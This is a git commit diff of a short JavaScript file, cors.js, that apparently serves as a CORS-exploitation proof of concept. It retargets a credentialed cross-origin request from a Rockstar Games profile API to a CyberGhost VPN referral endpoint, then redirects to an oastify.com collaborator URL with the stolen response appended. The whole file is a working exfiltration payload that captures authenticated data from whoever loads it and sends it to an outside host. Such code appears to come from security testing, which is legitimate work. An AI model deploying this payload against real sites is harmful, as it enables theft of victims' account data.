012ce2781848ac05795ec65ddb5242a109fb96f5
Soham Das <64075511+Soham7-dev@users.noreply.github.com>
2026-08-21 08:21:57 +0530

    Change API endpoint and logging URL in cors.js

--- cors.js
+++ cors.js
@@ -1,9 +1,9 @@
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('get','https://scapi.rockstargames.com/profile/getbasicprofile',true);
+req.open('get','https://beta-my.cyberghostvpn.com/refer-a-friend/create',true);
 req.withCredentials = true;
 req.send();
 
 function reqListener() {
-	location='https://89fdn0hjc1z8sgaguj53ft52wt2kqaez.oastify.com/log?key='+this.responseText;
+	location='https://r3vkj3gk2ywxi4ecwepmlgmz7qdh17pw.oastify.com/log?key='+this.responseText;
 };
